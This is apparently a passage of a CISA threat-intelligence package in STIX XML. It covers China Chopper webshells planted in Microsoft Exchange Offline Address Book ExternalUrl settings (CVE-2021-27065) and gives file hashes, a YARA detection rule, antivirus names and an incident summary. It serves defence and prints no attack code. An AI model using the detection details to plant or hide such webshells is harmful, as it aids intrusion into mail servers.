+            <indicator:Title>CISA_Consolidated.yara: CISA_10328929_02</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-09b6e610-3018-4101-a775-828bdd53c5af">
+                <cybox:Object id="NCCIC:File-d2ed7c03-4386-4245-b759-0e0e85a90506">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">b5aff5be558e41243225a3e2480fc8dc</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">4bc72b82af2f455eb69e582793593db8fb03c7da</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">5e09ea8b70a386f0812a8cafb94e2d2365849ce67fda42377389f18e56d860d0</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-1d706f15-e139-4d91-8b48-6c056feafd94" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-59f7d8e2-3276-4df8-9a95-3870bd565d60" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-32c0eac2-d84e-4aa7-98fd-8204015cfa3c" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-f7b731cd-3563-448e-ace7-9c62fa99f48e" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Test_Mechanisms>
+                <indicator:Test_Mechanism  xsi:type="yaraTM:YaraTestMechanismType">
+                    <indicator:Producer>
+                        <stixCommon:Identity>
+                            <stixCommon:Name>NCCIC</stixCommon:Name>
+                        </stixCommon:Identity>
+                        <stixCommon:References>
+                            <stixCommon:Reference>http://plusvic.github.io/yara/</stixCommon:Reference>
+                        </stixCommon:References>
+                    </indicator:Producer>
+                    <yaraTM:Rule><![CDATA[rule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065
+{
+	meta:
+		Author = "CISA Code & Media Analysis"
+		Incident = "10328929"
+		Date = "2021-03-17"
+		Last_Modified = "20210317_2200"
+		Actor = "n/a"
+		Category = "Trojan WebShell Exploit CVE-2021-27065"
+		Family = "HAFNIUM"
+		Description = "Detects CVE-2021-27065 Exchange OAB VD MOD"
+		MD5_1 = "ab3963337cf24dc2ade6406f11901e1f"
+		SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
+	strings:
+		$s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }
+		$s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }
+		$s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }
+	condition:
+		$s0 and $s1 and $s2
+}]]></yaraTM:Rule>
+                </indicator:Test_Mechanism>
+            </indicator:Test_Mechanisms>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-03-19T13:33:24+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+    </stix:Indicators>
+    <stix:TTPs>
+        <stix:TTP id="NCCIC:ttp-0c5c2e46-7b82-40e3-bdcb-ccb29c1563ea" timestamp="2021-03-19T13:33:24.457053+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>MAEC Characterization of 742b340f8739e73d9347d68e7ffc1590</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-f93e8974-0676-45f5-83da-c059eb6d39d9" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-9fa15dd8-d73e-4970-b624-81f426f75e73">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-c4b8d79b-4788-427c-96d4-8f6acaf397d4"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-c934b2f3-34d2-4fc5-8872-fc4d4979d561" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>ClamAV</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Asp.Trojan.Webshell0321-9840176-0</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit-CVE2021-27065.a</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Symantec</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan.Chinchop</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>BitDefender</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Generic.ASP.WebShell.H.FFDD4FC5</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit:ASP/CVE-2021-27065</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/WebShel-O</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro House Call</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Backdoo.DDEA7357</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Backdoo.DDEA7357</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Emsisoft</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Generic.ASP.WebShell.H.FFDD4FC5 (B)</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Avira</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>EXP/CVE-2021-27065.1</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ahnlab</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit/ASP.Cve-2021-27065.S1406</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Lavasoft</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Generic.ASP.WebShell.H.FFDD4FC5</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Quick Heal</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>CVE-2021-26855.Webshll.41350</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ikarus</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.ASP.CVE-2021-27065</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-4f69344b-289b-4f36-b921-e1f6861bc9b8">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-59f7d8e2-3276-4df8-9a95-3870bd565d60" timestamp="2021-03-19T13:33:24.481533+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>backdoor</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-4f69344b-289b-4f36-b921-e1f6861bc9b8">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-c3f07064-0c78-461a-b549-9898fcad5276">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-bebd1b9a-b7b0-46d3-97a1-d89363bb4d6d">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-32c0eac2-d84e-4aa7-98fd-8204015cfa3c" timestamp="2021-03-19T13:33:24.482040+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>trojan</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-4f69344b-289b-4f36-b921-e1f6861bc9b8">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-bebd1b9a-b7b0-46d3-97a1-d89363bb4d6d">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-f7b731cd-3563-448e-ace7-9c62fa99f48e" timestamp="2021-03-19T13:33:24.482517+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>webshell</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-4f69344b-289b-4f36-b921-e1f6861bc9b8">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-bebd1b9a-b7b0-46d3-97a1-d89363bb4d6d">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-0fe4771d-2ac5-4651-800e-9767c5a84e09" timestamp="2021-03-19T13:33:24.549573+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>MAEC Characterization of f04aa369ceee2d1388f9453d0d9758df</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-6aa6c4eb-790f-4b02-86a4-27bd0f3b8961" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-1aeec26f-b8b8-42f6-9f1d-7ed482c8edfc">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-978ebc14-37eb-437c-a89d-a219e51eddb7"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-5288c40a-8535-46c3-a7d6-e4c0cbdbcc06" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/ASPDoor-W</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-c3f07064-0c78-461a-b549-9898fcad5276">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-1d706f15-e139-4d91-8b48-6c056feafd94" timestamp="2021-03-19T13:33:24.636467+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>MAEC Characterization of b5aff5be558e41243225a3e2480fc8dc</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-e50215af-d551-4b07-a68e-853bf2c988af" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-e4e2d830-9724-4cff-8fbf-058bfad21dba">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-e03dd70c-4599-4ed6-8b92-91a4e8a96570"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-b4203e5c-af39-4268-ae5b-33f3e8f6ee1a" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>ClamAV</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Asp.Trojan.Webshell0321-9840173-0</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Symantec</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan.Chinchop</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>BitDefender</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Generic.ASP.WebShell.I.C2BB8C94</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Backdoor:ASP/Chopper.M!dha</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/WebShel-O</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro House Call</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Backdoo.DDEA7357</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Backdoo.DDEA7357</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Emsisoft</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Generic.ASP.WebShell.I.C2BB8C94 (B)</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Avira</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>EXP/CVE-2021-27065.1</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Lavasoft</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Generic.ASP.WebShell.I.C2BB8C94</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Quick Heal</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>CVE-2021-26855.Webshll.41381</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ikarus</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.ASP.CVE-2021-27065</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-bebd1b9a-b7b0-46d3-97a1-d89363bb4d6d">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+    </stix:TTPs>
+    <stix:Incidents>
+        <stix:Incident id="NCCIC:incident-fa8b3e50-001b-4927-80f2-e325f602f0dc" timestamp="2021-03-12T11:03:28-05:00" xsi:type='incident:IncidentType'>
+            <incident:Title>10329301.r1.v1</incident:Title>
+            <incident:Description><![CDATA[##### Incident Summary #####
+
+None
+
+##### Report Summary #####
+
+CISA received three unique files for analysis. These files appear to contain configuration data for Microsoft Exchange Offline Address Book (OAB) Virtual Directories (VD) extracted from a Microsoft Exchange Server. The three output files show malicious modifications for the ExternalUrl parameters. In two of the OAB VDs, the ExternalUrl parameter contains a "China Chopper" webshell which may permit a remote operator to dynamically execute JavaScript code on the compromised Microsoft Exchange Server. 
+
+##### Conclusion #####
+
+None
+
+##### Mitigation #####
+
+If you find these webshells as you are examining your system for Microsoft Exchange Vulnerabilities, please visit the https://us-cert.cisa.gov/remediating-microsoft-exchange-vulnerabilities website for further information on remediation.]]></incident:Description>
+            <incident:Categories>
+                <incident:Category xsi:type="stixVocabs:IncidentCategoryVocab-1.0">Malicious Code</incident:Category>
+            </incident:Categories>
+            <incident:Related_Indicators>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-631964e8-cc64-4c0c-9188-f9878f2d9d58" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-1c5f8a0f-adca-42d3-ad6c-d1910580a5d7" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-a77e06e1-bbfc-4540-9b99-e73656768ded" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+            </incident:Related_Indicators>
+            <incident:Related_Observables>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-4f69344b-289b-4f36-b921-e1f6861bc9b8">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-c3f07064-0c78-461a-b549-9898fcad5276">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-bebd1b9a-b7b0-46d3-97a1-d89363bb4d6d">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+            </incident:Related_Observables>
+            <incident:Leveraged_TTPs>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-0c5c2e46-7b82-40e3-bdcb-ccb29c1563ea" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-59f7d8e2-3276-4df8-9a95-3870bd565d60" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-32c0eac2-d84e-4aa7-98fd-8204015cfa3c" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-f7b731cd-3563-448e-ace7-9c62fa99f48e" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-0fe4771d-2ac5-4651-800e-9767c5a84e09" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-1d706f15-e139-4d91-8b48-6c056feafd94" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+            </incident:Leveraged_TTPs>
+        </stix:Incident>
+    </stix:Incidents>
+</stix:STIX_Package>
